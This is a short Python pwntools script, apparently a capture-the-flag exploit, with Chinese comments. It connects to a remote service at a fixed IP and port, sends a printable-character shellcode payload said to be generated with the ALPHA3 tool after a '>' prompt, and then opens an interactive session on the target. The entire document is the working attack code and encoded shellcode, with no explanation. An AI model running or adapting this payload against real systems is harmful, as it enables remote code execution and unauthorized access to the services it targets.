from pwn import *

# 目标程序的地址信息
host = '10.12.153.73'
port = 11632
p = remote(host, port)

# 可见字符 Shellcode，由 ALPHA3 工具生成
payload = (
    b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
)

# 发送 Shellcode 并执行
p.sendlineafter(b">", payload)
p.interactive()
